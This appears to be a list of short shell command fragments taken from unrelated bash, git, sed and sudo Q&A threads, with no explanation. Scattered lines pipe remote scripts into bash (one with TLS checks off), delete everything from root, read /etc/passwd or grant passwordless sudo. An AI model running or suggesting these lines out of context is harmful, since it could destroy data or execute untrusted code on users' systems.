$ grep sysa /etc/passwd || { echo "ERROR - The user sysa could not be looked up"; exit 2; }
if ! [ $(true) ]; then echo false; fi
if ! grep ...; then
cat /etc/passwd | grep "sysa" || echo error
grep "sysa" /etc/passwd || echo error
grep -q "$username" /etc/passwd
exit status
sudo ping
sed | sort | uniq
uniq -ic
print whatever
$ awk -f word_freq.awk the-king-james-bible.txt > bible_words.txt
cd $DIR # step into folder
cd $i # step into folder
git branch -r | grep -Eo 'PREFIX/.*' | xargs -i git push origin :{}
branch -r
sed "s/origin\///"
remote ref does not exist
error: unable to delete 'release-...2018': remote ref does not exist
branch -r
cut -f2- -d/
git remote update origin --prune
| sed 's/origin\/\(.*\)/\1/g' | cut -c 3- |
git ls-remote
git remote add
date --date="4 days ago" +%F
echo $(stat ...)
Warning: NLS_LANG is not set. fallback to US7ASCII.
sed -n '/Foo/,/Bar/Ip' test.txt
(as mentioned in your question)
unicode non-letters
gunzip | map_to_old_format.py
f = gzip.GzipFile("", "rb", fileobj=sys.stdin)
echo $data | gunzip
"... stuff match stuff ..."
Show only the part of a line matching PATTERN
Only print filenames containing matches
check_prog hostname.com /bin/check_awesome -c 10 -w 13
for i in $(seq 0 100); do curl -z image$i.jpg -O --max-time 10 --retry 3 --retry-delay 1 http://site.com/image$i.jpg; done
. .params.conf
key value that can have space in it
-maxdepth 1
find . -maxdepth 1 -type f
fls --help
fls --man
curl -L https://git.io/n-install | bash
chmod +x fls
ls --help
! -name '.*'
$ curl -kL get.rvm.io | bash -s stable
chsh -s /opt/local/bin/bash
shell '/opt/local/bin/bash' does not exist
sudo port install bash
rvm requirements
rvm pkg install zlib
rvm help autolibs
rvm pkg install zlib
Installing required packages: autoconf, automake, [etc.] gdbm, ncurses........
BASH 3.2.25 required (you have 3.2.17(1)-release)
/rvm-installer -s stable
SSL certificate problem
"[1] TRUE"
"[1] FALSE"
echo -e
echo -e 'hello\r'
echo -n
echo -e -n 'hello\r'
echo -n -e 'hello\r'
echo -en 'hello\r'
echo -ne 'hello\r'
echo -e '\n'
echo '\n'
REP="${REP//\+( )/\\n}"
GNU bash, version 3.2.48(1)-release (x86_64-apple-darwin11)
[[ $current_branch =~ ^(t|b|bug_|task_|)([0-9]+) ]]
regex (7)
((i++)); marg=${@:i:1}
git diff
git show
git diff
git show
git config --global core.pager 'less -x1,5'
unset my_list
declare -p
shopt -s lastpipe
myVar="$( declare -p myArray )"
declare -p
declare -p myVar
declare -a myVar='([0]="1st field" [1]="2nd field" [2]="3rd field")'
declare -p
declare -a
declare -p dst
declare -a dst=([0]="one" [2]="two three")"
declare -p
([0]="one" [2]="two three")
declare -a dst=( "true parens outside string" )
declare -a dst=([0]="one" [2]="two three")
(( $# == 0 )) && readarray -t temp && set "${temp[@]}" && unset temp
declare -p
declare -p
declare -p
declare -g
A\texthyphen B
a\texthyphen b
%\texthyphen b
man 1 ps
sqlplus -s user@schema/password
sqlplus user/password@schema 
cat file.tar.gz
bash -c <command>
sh -c <command>
sh -c
while read -r line; do lines+=("$line"); done <<<"$string"
'Los Angeles, United States, North America'
'Los Angeles, United States, North America'
'Los Angeles:United States:North America'
set -f
set +f
${string//:/ }
'Los Angeles, United States, North America'
set -f
set +f
set -f
set +f
set -f
set +f
: builtin
-C callback
", "
IFS=", "
" "
", "
", "
"${string//, /$IFS}"
enter code here
while read
declare -a a=([0]="a")
declare -a a=([0]="a" [1]="")
declare -a a=([0]="a-")
declare -a a=([0]="a" [1]="-")
$(grep $file failed.txt -c)
[0 -ne 0]
-ne 0]
[ $(grep $file failed.txt -c) -ne 0 ]
[ 0 -ne 0 ]
for file in *; do { echo "checking: $file" && grep failed.txt $file && echo "$file FAILED";  done
man grep
> junk
./tools/deploygit: 9: [: git: unexpected operator
if [ git diff-index --quiet HEAD ]
-selection primary
-selection secondary
-selection clipboard
$ ./backup.sh
bB nN zZ
scp SYSTEM3:/data /data
echo "${LIONS[5]}"=>"Mister Mufasa"
eval echo `echo...
eval echo `print...
grep -Po '\S*\.(?=$|\s)'
COMMAND='cp ./foo ./bar; mv ./bar ./baz'
cp ./foo ./$OUTPUT_DIR/baz
eval PWD="./$OUTPUT_DIR" $COMMAND
cd $OUTPUT_DIR; ../$COMMAND
cp ./foo ./bar
echo foo | head
< <(sort "$file")
(2 x 2) + 1 = 5
(2 x 2)
alias ls='ls --color=auto'
The fish ate the worm.
The lionfish ate the worm.
git branch --merged
grep -v \*
git branch -D $b
echo $b
git branch
git checkout <TAB>
git branch -D <PASTE THE BRANCHES NAMES HERE>
git branch
git branch
error: branch 'foo' not found.
git branch
git branch
git branch
git branch
git branch > sample.txt
awk 'BEGIN { ORS = " " } { print }' sample.txt
git branch -D branch_name(s)
git branch | grep -v "master"
xargs git branch -D
git branch -d $(git branch).trim()
* master
git branch -d [branch name]
git branch -D [branch name]
cd ../
cd ../..
wget -i urls.txt
time wget http://some.url
WORD1 WORD2 WORD3
WORD1 foo WORD3
sed -i '' 's/WORD1.*WORD3/foo/g' file.txt
$ sed -e 's/\([^ ]\+\) \+\([^ ]\+\) \+\(.*\)/\1 foo \3/' file.txt
$ awk -F' ' '{ print $1" foo "$3 }' file.txt
while read
$file = dos1-20120514104538.csv.3310686
$date = 2012-05-14 10:45:38
$id = 3310686
2012-05-14 10:45:38
while read / cat/ loop
sed '...'
Content-Encoding: gzip
Content-Encoding: deflate
gem which rspec/core
gem which rspec/core | 2dir 3
$( )
echo "$PWD"
ssh -A
sleep 30
[ -d $i/... ]
[[ -d $i/... ]]
[[ ]]
[ -d "$i/..." ]
set -o vi
grep ":80 "
grep 80
wc -l
netstat -ntpl | grep ':PORT '
< $f >! $f
<a href="index.php?page=asdf">"asdf"</a>
<a href="asdf">"asdf.html"</a>
tr -d '\r'
perl -pi -e 's/\r\n/\n/g' *
tr -d
Can't do inplace edit:
bash trap.sh
declare -f nonap
trap -- 'nonap' SIGINT
declare -f nonap
Naptime over.
No time for napping!
Toru JL:
trap INT
this * is a string
this * is a test
info gettext
LC_MESSAGES=C git
vim ~/.bashrc
nano ~/.bashrc
alias git='LANG=en_GB git'
source ~/.bashrc
nano ~/.profile
source ~/.bashrc
source ~/.bashrc
-b cookie.txt -c cookie.txt
read -t 15 myVar
Enter command:
Enter command:
Enter command: foo
stty -pendin
stty pendin
stty pendin
./script.sh 2 Vocab May12
R CMD BATCH --no-save --no-restore --slave '--args $1 $2 $3' tabulate.r /dev/tty
" '--args $1 $2 $3' "
'--args $1 $2 $3'
set -x
line 22: ${$2[@]}: bad substitution
git branch -a | grep -v "zoo"
git branch -a
git branch -a
git branch --color=always -a | grep --color=never -v "zoo"
for ... in
[some text]
\macro{some text}
[a-z, A-Z and space]
\macro{<whatever was between the []>}
\( ... \)
ls /bin/[
ls /usr/bin/[
date -Q
(( ))
[[ ]]
.../case[@var =~ /some_regex/]
.../case["xyz4A" =~ to_regex(@var)]
.../case[explode_braces(@var) =~ /(^|,)xyz4A(,|$)/]
readlink latest
chcp.com 65001
char *
const char *
wchar_t *
const wchar_t *
char *
Git Bash
Character set
foo bar foobar
foo bar
man bash
man bash
set -e
name =
cluster {
cluster {
wasClusterLine = true
name =
wasClusterLine = false
cluster {
cluster {
/cluster {/,/}/
s/name = "'"$old"'"/name = "'"$new"'"/
basename $(pwd)
basename $(pwd)
cat $pipe
eval "\cd xxx"
\cd xxx
ls|grep great‬‬
command > file
61 61 61 0D 62 62 62
sed 's/^M/
echo -n '
' | hexdump -C
echo foo
echo bar
grep -oE '\([[:alnum:]]*?\)' | sed 's/[()]//g' | sort | uniq
awk -F "[()]" '{ for (i=2; i<NF; i+=2) print $i }' file.txt
awk -F "[()]" '{ for (i=2; i<NF; i+=2) array[$1]=$i; print array[$1] }' file.txt
ssh -i private_key user@ip 'path/to/script.py .bash_history'
" "
svn state
svn add
svn remove
svn remove
svn add
svn rm
svn stat
svn rm
svn add
svn rm
touch "$filename" ; svn rm --force "$filename"
svn revert "$filename"
-type -f
-type f
-type -f
-type -f
awk '{ for (i=1; i<NF; i++) if ($i ~ /\\/) printf "%s ", $i; else if ($i !~ /\\/) printf "%s\\ ", $i; printf $NF"\n" }' file.tex
s/\(\\[^ ]*\) /\1\n/g
s/ /\\ /g
y/\n/ /
set -o
$PS1="$ "
Get your demo!
echo http://$urlnya/
port no
cd -
[ -f ~/.bashrc]
if [-f ~/.bashrc]
cat hamlet.txt | words
htmlstrip http://www.google.com.au | words
./words.py http://whatever.com
amixer set Master 1+
forauir somethingelse
sed -n '/auir/p' myfile.txt | head -1
echo $user
tail -1
-H "X-Caption: Test Caption"
read -n 1
read -n1
illegal option n
read -rsN 1
read -rsn 1
# echo "Key: ${keyCode[*]}"
man ping
ping www.google.fr | while read pong; do echo "$(date): $pong"; done
ping -i 5 google.com | xargs -L 1 -I '{}' date '+%Y-%m-%d %H:%M:%S: {}'
ping -i 5 google.com | xargs -L 1 -I '{}' date '+%Y-%m-%d %H:%M:%S: {}' > test.txt
ping -i 5 google.com | xargs -L 1 -I '{}' date '+%Y-%m-%d %H:%M:%S: {}' | tee test.txt
nohup ping -i 5 google.com | xargs -L 1 -I '{}' date '+%Y-%m-%d %H:%M:%S: {}' > test.txt &
ping --apple-time 127.0.0.1
${_archive} -c ${ARCHIVE_PATH} ${_today}
echo $TARC
env|grep PATH
PATH=$PATH:/c/Program Files (x86)/random/application
PATH=$PATH:/c/Program\ Files\ \\(x86\\)/random/application/
git bash
env|grep PATH
C:\Users\<username here>\AppData\Local
Windows Explorer
env|grep PATH 
MSYS_NO_PATHCONV=1 
docker --help
 az.cmd
alias az='az.cmd'
az --help
help eval
hello 42 world
bash -c "echo \"$(cat something.txt)"\"
-bash: mypassword: command not found
ssh-keygen -f ~/.ssh/id_rsa_that_key
ssh-add ~/.ssh/id_rsa_that_key
svn propset
svn propset -r945 --revprop svn:log '[Release ] [story]' blahReport.sh
echo $(MODULES)
> ./Server.out
while read
Page xx Question xx
Page  43  Question 2
(global-set-key "\C-M-v" 'scroll-other-window-up)
find /home/httpdocs -name "*.xml" -mtime +7 -exec archive {} \;
crontab -e
sudo crontab -e
chmod  +x run
git commit -m 'backup'
cd ~/foo
between a and b inclusive
#!/usr/bin/env node
./mydownload 2011 8 29
FNR == NR
--ifs "|"
-l 7 -r 1
cut -f 3
sudo command
shopt -s expand_aliases
single token
--noprofile --norc
man bash
$(( ))
[ ]
$(( ))
[ ]
help "("
help let
help [
help test
[  ]
$(( ))
echo "$var" >> testFile.txt
echo $log
| echo "hwaddress ether $var" >> testFile.txt
<a b="c"/>
<a b="c"></a>
git format-patch -1 'da591d66f05513488ee06857edc9d24a046c179d' --start-number=1
git log | grep $COMMIT
grep '992ab41d3539539bd609209beed33a9de2f4277a'
man find
alias -g
printf %s "$(...) "
grep "$a" replaced.txt | cut -f 2 -d" "
printf %s ...
echo -n ...
git status
xdg-open file.txt
xdg-open file.xml
[[ ]]
rsync: link_stat "<source path>*" failed: No such file or directory (2)
tr p [:lower:]
tr -d
tr -d '[:digit:][:punct:]'
$f != "*.qrc"
[^" ]*
sed 's/"[^"]*"/\n&/g;
:a;s/\(\n"[^"]*\) /\1_/g;ta
man bash
set precmd 'bash $HOME/.local/bin/on_cd.sh'
ps -aux
ssh 10.10.10.10
/bin/rm -rf /*
eval eval eval... \$${ssh} ....
null string
$ source FILE 2> /dev/null
uniq --check-chars=5 file.txt
ps --ppid ORIGINAL_PROGRAMS_PID
ctags -R
ranges = {'chr1': [[8, 15], [10, 14], [32, 34]]}
ranges = {'chr1': [[8, 15], [32, 34]]}
overlap(r1, r2)
sudo mkdir
mkdir -p
set -e
set -e
set -e
set -ex
. err.sh
... | while read X ; do ... ; done
while read X ; do ... ; done < <( ... )
| tr "p", " "
eval alph=\$$n; echo $alph
" aa_something_something"
" aa_something_something"
application > file
application < file
application  >> file
app1 | app2
app &
eval echo \"\$$bar\"
<pkg-info overwrite-permissions="true" relocatable="false" identifier="com.${NAME}Package" ...
cut -d: -f1
cut -d: -f2
|| [ -n "$new_one" ]
date -d "datestring"
date -d "12/31/2012"
date -d "12-31-2012"
date -d 'yesterday'
date -d '1 week ago'
date -d "$date"
[ "z$date" != "z" ]
[[ "$date" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]]
source ~/.bashrc
#! /usr/bin/ksh
Exit Code 1
| echo $?
e.g. ( "A: 2" "B: 3" "C: 1" )
Owner: 0; Claimed: 1; Unclaimed: 1; Matched: 2
stty -echo
stty intr ^B
exec ./a.out
echo $PATH
cd ~
ln -s /usr/bin bin
[target diectory]
[name of link]
cd bin
cd ~
sudo ln -s "/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl" ~/bin/subl
$ echo $PATH
No such file or directory
echo 3232235521| awk {'print rshift(and($1, 0xFF000000), 24) "." rshift(and($1, 0x00FF0000), 16) "." rshift(and($1, 0x0000FF00), 8) "." and($1, 0x000000FF) '}
sleep(rand(60, 1.5 * 60))
ls *.mkv
find . -name "*.mkv"
'env hostname'
env hostname
env hostname
help test
git commit -a -m 'message'
git commit --add --message 'message'
command --long --another-long
command -la
read -r folder_name < fold.txt
. bashrc
ls [max|min].txt
shopt -s extglob
echo @(mid|min|max).txt
echo @(min|mid|max).txt
echo {min,mid,max}.txt
set tabstop=4
cat somefile
php -r 'echo "\t123";'
tabs 4
tabs 5,9,13,17,21,25,29,33,37,41,45,49,53,57,61,65,69,73,77
man tabs
tabs -v
GNU bash, version 4.2.46(2)-release (x86_64-redhat-linux-gnu)
PuTTY Release 0.73 Build platform: 64-bit x86 Windows
Linux VPS 3.10.0-1127.18.2.el7.centos.plus.x86_64
git diff
tty -s <&1
for i in *
for i in $(ls)
load data infile
on duplicate update
man bash
nohup [..] &
> /dev/null
-j jdcfile
String scriptPath = getServletContext().getRealPath("/script.sh");
new ProcessBuilder("/bin/sh", scriptPath).start();
foo bar baz)
program.sh -a -b stuff.txt  -c -d
[ -d "$path" ]
[ -d $path ]
rm -r "$path"/*
man bash
find -name '*.bak'|sed 's:.bak$::'|xargs -n 1 -I % cp %.bak %
command pwd
pwd -P
No such directory foo in current directory hierarchy
rename -n -- $regex $filenames
[[ ]] &&
ls -S
head -1
if [[ -s
O(|A| + |B|)
O(|A| log |A| + B log |B|)
grep -m 1
awk 'NR==FNR { arrA[$0]; next } $0 in arrA' file_A file_B > result
file.php -key=value
./file.sh -key=value
value1 value2
yum install inotify-tools
aptitude install inotify-tools
git ls-files
find ./ -name \*.txt | perl -p -e 's/^(.*\/(.*)\.txt)$/mv $1 .\/foo\/$2.bar.txt/' | bash
/sbin/service process command
echo $NODE_ENV
printenv list
echo $NODE_ENV
printenv NODE_ENV
printenv PATH
su - oracle
:echo $VIMRUNTIME
Here be dragons
declare -A
if [ -d "$directory" ]
[[ -d $directory ]] || continue
[ ]
[[ ]]
[ ! -d "$directory/processed" ]
mkdir -p "$directory/processed"
command -v convert
type convert
command -v
declare -a
directories_to_process=( ... )
s/,{\([^}]*\)},\([^,]\+\)/ ((\1) \2)/g
s/,/ /g
s/^\([^ ]*\).*/(define v\1 '\''(&)) ;;...\1/p
read year
sed -re 's/[0-9-[25]]/*/g'
wrapper.sh script.sh
set -x
set -x
curl --verbose https://testflightapp.com
About to connect() to testflightapp.com port 80 (#0)  Trying 110.173.143.147...Operation timed out
syslog file
cat test.txt | xargs -I % sh -c 'echo % | tr -cd , | wc -c'
python -c "import pathlib; print({l.count(',') for l in pathlib.Path('my_file.csv').read_text().splitlines()})"
chmod a+x scriptname.coffee
cmd -f -- -other
-m "Commit message"
sudo -l
sudo -n true
sudo -n true
sudo -n mount
echo SAMPLE{$i}
man bash
python manage.py runserver
python manage.py runserver
source .bashrc
. ./b.sh
./b.sh: No such file or directory
File color.sh
Ubuntu 18.04
GNU bash, version 4.4.19(1)-release (x86_64-pc-linux-gnu)
source <file-name>
source config.sh
echo total: $total
perl -n
-S          The -S (stdin) option causes sudo to read the password from the standard input instead of the terminal device.  The password must be followed by a newline character
sudo -l
sed -f - input.txt
grep -o '^[^;]*' file2.txt
uptime ; uname -a
"'uptime ; uname -a'"
./script $(echo foo)
./script foo
./script "foo"
./script \f\o""''""o
'uptime ; uname -a'
uptime\ \;\ uname\ -a
"uptime ; uname -a"
printf %q
script --argument="--arg-inner=1 --arg-inner2"
--argument=--arg-inner=1\ --arg-inner2
some_command >> log.log
some_command 2>&1 | perl -ne '$|=1; print localtime . ": [somme_command] $_"' >> /log.log &
find . -name Makefile
find --help
FIND: Paramater format not correct
gem uninstall rails -v="$( rails -v | sed 's/.* //' )"
git diff
git diff --cached
if [ -z $VAR ]
git diff
git rev-parse
rm -rf
git clean -nd
git clean -d
git clean
git clean
git check-ignore
set -e
while read
man ssft.sh
text/html; charset=ISO-8859-1
bash -c
sudo -i /bin/bla/whatever
sudo -i -u user /bin/bla/whatever
man sudoers
/bin/bash -c
sudo true
bash -c true
bash -c /bin/true
sudo -S
req.session.co === true
curl --request GET <url> -H req.session.co: true
ssh -i my_key user@ip 'command1 command2'
sudo chmod +x file.sh
grep -nr "expression" /path/to/files/
env FOO=BAR command
command1; command2
git clone "$repository" "$localFolder"
git clone $repository" "$localFolder
tail -1
'{print parameter}'
p $validresponse
man find
man bash
sh -c "string containing commands to be executed"
snprintf(command, sizeof(command), "sh -c '%s'", escaped_buffer);
mysql --skip-column-names -u root -p -e 'show databases' | while read dbname; do mysqldump --lock-all-tables -u root -p "$dbname"> "$(date +%Y%m%d)-$dbname".sql; done
mysql --skip-column-names -u root -p -e 'show databases' | while read dbname; do mysqldump --lock-all-tables -u root -p "$dbname" | gzip> /tmp/"$(date +%Y%m%d)-$dbname".sql.gz; done
set -g mode-mouse on
set -g
make clean
find ... -delete
s | s-split "\n\n" | nreverse | s-join "\n\n"
(s-join "\n\n" X)
NR == FNR
! flag
while read
man bash
sudo su -
chmod 755 pathtouyourscript
! -z
for i in /dir/*
ln -T
file --mime
file -I
file -i
FILE0001.CHK /tmp/renamed/FILE0001.jpeg
ln -s "/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl" ~/bin/subl
sudo ln -s /Applications/Sublime\ Text\ 2.app/Contents/SharedSupport/bin/subl /usr/bin
sudo ln -s /Applications/Sublime\ Text.app/Contents/SharedSupport/bin/subl /usr/bin
$ subl .
which subl
--user-agent="MyScript/1.0 (http://mywebsite/)"
zenity --progress
> fileC
not a number greater than 0
((a <= 0))
chmod +x wrapper_name
sudo ldconfig
Server 1
pdsh -R exec server[2-100] service httpd restart
let a=10,b=20,c=30
cat \1
cat 1
git clone https://github.com/tinmarino/dev_one.git DevOne && cd DevOne  # Download
make build        # Compile
make key          # Generate key for signing
sudo make sign    # Sign driver module to permit MOK enforcement (security)
sudo reboot now   # Reboot and enable Mok
make sign
sudo make load    # Load
sudo make device  # Create /dev/one
make test         # Test if all is ok
cmp -s <( cmd1) <(cmd2) && cmp -s <( cmd1) <(cmd3)
cmd1|tee >( cmp  -s <(cmd2) )|cmp -s <(cmd3)
echo $pass
wait $PID_LIST
command1 && command2
man wc
wc -l <filename>
wc -l
cat /etc/password
find ... -exec ... \+
find ... -exec ... \+
'LANG="en_US.UTF8" mono %sengine/helpers/language/morpher.exe %s';
man 1 find
which push
sudo visudo
"--exclude test/testdir --exclude test/testdir2"
"-C /Users/user1/Desktop/ test"
-g =$SAVEDIR/backup.snar
bsdtar 2.8.3 - libarchive 2.8.3
ssh rach@kamel
bash script
cat -A devBuild.sh
cat -A dev.sh
for i in $input; do
"a" "a b"
$(echo ...)
play reload
play reload || nohup play start
play reload
play reload
play stage
play stage
ps -p $$ -o ppid=
ps afx
--save-cookies cookie_file
--load_cookies cookie_file
man bash
./script unreadable.log
|| [[ -n $line ]]
read -u3
read <&3
man 1 read
-u 3
while read -r line
read -a
read -d ' '
export -p
declare -F
set -u
header ("location : https://localhost/test=123")
if( ! waitForStarted()
mktemp -d
LD_PRELOAD=/... program args ...
SOMEVAR=BBB eval echo zzz '$SOMEVAR' zzz
SOMEVAR=BBB sh -c 'echo zzz $SOMEVAR zzz'
echo zzz $SOMEVAR zzz
SOMEVAR=BBB; echo zzz $SOMEVAR zzz
echo zzz $SOMEVAR zzz
zzz BBB zzz
cd D
sh: 2012-06-08-01-25.sql.gz: Permission denied mysqldump: Got errno 32 on write
printf "%f",
ls [a-z]*
\Music\New\2010s\2011\Ziggy Marley - Reggae In My Head.mp3
\Music\Lady Gaga - Paparazzi.mp3
"Not Found"
GET (something) http <server_ip>
make -j
ls *(h|cpp)
*.h *.cpp
echo *.h *.cpp
ls *h *cpp
gksudo ./myScript.sh
myBashfile.sh *sh
declare -n
! =
* * * * * /usr/local/bin/temp_cpu_gmetric.sh
echo $CRONCONT
* * * * *
* * * * *
* * * * *
echo  "${YOURVARIABLE}"
bind -P
man readline
declare -n
if [ ! -e $var1 ]
if [ ! -e $1 ]
func1 $var1
func1 $err_var
func1 $var1
set -e
mv: rename /Users/user/Desktop/File_Converted/* to ...
echo $TMPDIR
mktemp /tmp/mytemp.XXXXXX
ps -wef
if [ "$i" = "0" ]
<some output producing command>
cat filename.txt
echo $VAR
ls -l | awk '{print $9}'
ls -1
read -p 'Prompting: '
myBashfile.sh -e *sh
-printf "%-20f %h"
tee -
1>&2 2>errors.txt
2>errors.txt 1>&2
LOAD DATA LOCAL INFILE
ls -R
adb devices
adb devices
apache    ALL=(ALL)  NOPASSWD: /sbin/service myproject *
/sbin/service myproject stop
/sbin/service myproject start
sudo -u THE_SUDO_USER
<p> Text </p>
<p> Text </p>
[: 11: $EDAx: unexpected operator
./nfoo.sh 4 bar, ./nfoo.sh -4 bar, ./nfoo.sh 4 foo and ./nfoo.sh -4 foo
echo ${line/ */}
bind -r "\C-w"
bind -u unix-word-rubout
bind -P | grep unix-word-rubout
echo *
help umask
man mktemp
kill -9
mktemp -p
mktemp -t
find . -name '*' -exec command arguments {} \;
find . -type f -print0 | xargs -0 command arguments
find . -type f | xargs -I {} command arguments {} arguments
for file in *; do command_myfunction_or_script.sh arguments $file; done
-type d
grep -f
declare -p
read -n 1 -s
-n 1
trap "{ rm -rf $LOCK ; rm -rf $TMPFS_FILE; exit 255; }" SIGINT SIGTERM
man 1 flock
date --date='06/12/2012 07:21:22' +"%s"
date -f - +%s
echo $ans
"2019-25-12 20:10:00"
bash -c
-mindepth 1
Bash parameter expansion
wc -l file
test condition
[ condition ]
[ ]
strftime format
data2.txt <=============================================>
export PATH=/usr/local/bin:/usr/local/sbin/:usr/bin:/bin:/usr/sbin:/sbin:/usr/X11/bin
make install
if macOS { use mac commands } else { use linux commands }
if gnuTools { use gnu commands } else { use bsd/posix commands }
man bash
ls -la
<key code>
Ctrl-V <key>
some_long_command with_some_arg
some_long_command with_some_other_arg
(cd myfolder && ./script.sh)
chmod +x script.sh
return 0
exit 0
export -f
var=$(something | bash -c 'some operation using builtin printf')
kill $PPID
PPID=$( ps -o ppid= $$ )
ls -d
ssh -t webservice_username@remotehost1
sudo -u webservice_username -i
sudo -u webservice_username - i
M-x term
/usr/bin/emacs23 %F
ls /data/testuser/jobs/example/a16162/foo1*
set -f
set +f
man bash
help test
help [
help [[
man bash
man 1 kill
kill -l
man 2 kill
kill -0
kill -0
kill -0 $pid
kill -0 $pid
kill -0 $pid
killall -0 <process name>
GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)
R CMD BATCH script.r script.out
Permission problem or command is not an executable
Command Line Tool
./MyProgram > TextFile.txt
open MyProgram
man date
man terminfo
man 5 terminfo
make foo
make foo
export MY_VARIABLE='true'
make foo
commands commence before first target
git commit -m "Frustrating <insert object of frustration here>"'!'
git commit -m "Frustrating <insert object of frustration here>\!"
set +H
set +o histexpand
python bla bla
$ sudo pathtotomcat/bin/./startup.sh
unset CATALINA_HOME
catalina.sh run
log out
log in
OS X
unset CATALINA_HOME
-f' option has been set (see section 4.3.1 The Set Builtin), Bash scans each word for the characters
?', and
[[ ... ]]
cat hash_only.txt
source config.sh
$( ... )
${ cmds;}
(echo std; echo err >&2)
catch VAR1 VAR2
command args..
if cmd args..; then
if catch VAR1 VAR2 cmd args..; then
set -e
 && ret=$? || ret=$?
catch out err dummy 1 2a 3b
eval "$({
__1="$("$("${@:3}")"; } 2>&1;
dummy 1 2a 3b
printf '%q=%q\n' "$1" "$__1" >&2;
exit $ret
__2="$( ... )"
printf '%s=%q\n' "$2" "$__2" >&2;
printf '( exit %q )' "$ret" >&2;
printf '%s=%q\n( exit %q )
eval "$({ ... } 2>&1 )";
printf %q
$(echo $'\n\n\n\n')
$( .. )
printf %q
: catch STDOUT STDERR cmd args..
# catch STDOUT STDERR cmd args..
bash -x
kill -9
trap 'rm "$tmpfile1" "$tmpfile2"' 0
catch stdout stderr command args..
printf '\0%s\0'
shift 2; ${@}
exit $(cat)
exit $(cat)
< <()
< <()
<<EOF … EOF
exit "${CAPTURED_EXIT}"
find /proc
xargs -0 printf
|| :
echo -n "${buf}"
..."$(((({ "${@:3}" ; echo...
sed -e 's/^/stderr/g'
xargs -d '\n' -I {} echo "stderr{}"
umask 0
echo $rvm_path
ps -aux
doxygen --help
INPUT = some file
ulimit -u
hard tab characters
grep -c \t foo
sed -e "s/([0-9]*\)\s.*/\1/"
s/match pattern/replacement/
/( /)
<(sort -b $fileN | awk '...')
sort -b
-t ' '
-j 1
-a 1
-a 2
$11 + $12
5 min * 60 sec/min)
$somename + timestamp() % 300
$somename + (timestamp()+1) % 300
2009-96 2010-100 2010-101 2010-97 2010-98 2010-99 2009-99a 2011-102
2009-96 2009-99a 2010-97 2010-98 2010-99 2010-100 2010-101 2011-102
sort -t - -k 1,1n -k 2,2n <filename>
$(( ))
me@mycomputer:~$ cat /usr/local/bin/c
c 5x5
c 5-4.2 + 1
c '(5 + 5) * 30'
$(( expression ))
#!/usr/bin/env ruby
do shell script
quoted form of POSIX path of FilePathName_s
FilePathName_s = "/" & Replace(FilePathName_s, ":", "/")
ls -l test.sh
ls -l@ test.sh
xattr -c test.sh
Shell ActiveWorkbook.Path & ":test.sh"
defaults write com.barebones.textwrangler WriteExtendedAttributes never
let g:is_bash=1
syntax on
let g:sh_no_error=1
tar -cvfz
pwd -P
{'cwd': '<NEW PATH>', 'result': '<COMMAND OUTPUT>'}
id -nu
man rename
java -jar whatever.jar
${@: -2:1}
!= 0
stat == 0
set -e
netstat -lpn -t tcp
eval echo \${$n}
echo $1
echo $1
eval <some command>
<some command>
echo $($n)
eval echo \${$n}
eval echo \${$n}
echo ${1}
"$foo", "$(foo)"
echo $key=$val
*/10 * * * * root program arg1 arg2
eval $( cut -d ' ' -f 6- /etc/cron.d/repeatme)
gkrellm &
nohup cmd &
compgen -W
pkill -P PID
ls -a ~/dotfiles
find ~/dotfiles -maxdepth 1
task successfully completed!
mkdir a b ; touch a/HouseFile.txt a/ChairFile.txt a/CouchFile.txt a/SomeFile.txt b/House.txt b/Chair.txt b/Couch.txt b/Sofa.txt
for file in a/*(.); do [[ ! -f b/${${file##*/}:fs@File@} ]] && echo $file ; done
mke2fs -t ext2 /dev/ram1 204800
/var.....cp -a /mnt/ramdisk/var/. /var
$> ./script.pl
$> ./script.pl > text.txt
./script dir
echo -e $matched
is 20 less than 25?
-a false
-a false
user ALL=(ALL) ALL
typeset -u
typeset -l
typeset -u
typeset -l
typeset -l
typeset -u
typeset -l
file2=$(echo $file | sed -e "s/[1080p]//g")
cp /sourcepath/$file destinationpath/$file2
sh -c
a +=b
a = a + b
a=$(($a+ $b))
(( ... ))
-and -not
$ ./myscript.sh -wef | egrep ".*somethingtomatch.*"
-wef | egrep ".*somethingtomatch.*"
ps -wef | egrep ".*somethingtomatch.*"
$ ./myscript.sh -wef | egrep ".*somethingtomatch.*"
$ ./myscript.sh -wef | egrep ".*somethingtomatch.*"
-wef | egrep ".*somethingtomatch.*"
ps -wef | egrep ".*somethingtomatch.*"
egrep ".*somethingtomatch.*"
./myscript.sh -wef somethingtomatch
i<$stack_size + 1
tar -xf $file -O <targetname>
tar --to-stdout -xf $file
tar --to-stdout
find /etc \( \( -perm +222  -not -user root \) -or \( \(-perm -022 -or -perm -002 -or -perm -020 /) -user root /) /)  -ls
-t 4
brew install moreutils
sudo port install moreutils
brew install coreutils
sudo port install coreutils
find . -iname '*.java' -type f -exec sed -i.orig 's/\t/    /g' {} +
shopt -s globstar
+'set ts=2'
find -exec
type -f
-exec bash -c
expand -t 4
> "$0"
git grep --cached -Il ''
chmod --reference
set -b
(sleep 10 &)
set +m
set -m
man bash
set +m
set +m
/usr/lib64/nagios/plugins/redis_llen.sh 192.168.5.201 2468 -w 90000 -c 100000
llen queue_1
redis-cli --csv
man which
sort -n
$USER ALL=(ALL) NOPASSWD: /usr/bin/wondershaper
sudo echo
hadoop dfsadmin -safemode wait
-safemode wait
wc -l
grep -m 1
sed '/sudo version/!d;q'
bash --posix
convert *.jpg *.png
find -type d
rsync --include-from=rsync-files
sed "s#""#'#g"
sed "s/""/'/g"
grep -o "class='name[^>]*"
sed -n "/id=/p"
grep -o "surname=[^>]*"
cut -d"'" -f2
<class="name17" id=13> <surname=Frank>
man <command name>
sed "s#""#'#g"
grep -o "class='name[^>]*"
sed -n "/id=/p"
sed -n "<some pattern> /p"
grep -o "surname=[^>]*"
cut -d"'" -f2
/bin/sh child.sh
hash -r
diff before.txt after.txt
ls -lt | head
ls -lt
type -f
-exec {} +
-exec {} \;
for i in {1..5}
logparser "select date from testFile.log" -i:IISW3C -o:CSV
Error: detected extra argument ""select" after query
files=~/Movies/My\ Folder/My\ Subfolder/*
files=~/"Movies/My Folder/My Subfolder"/*
-exec rm {} \;
-exec rm
rm [opts] -- [files]
openssl sha1 < /dev/null | wc --bytes
openssl sha1 < /dev/null | wc --bytes
xxd -r -p
git branch
git diff --quiet
git diff --quiet --cached
git ls-files
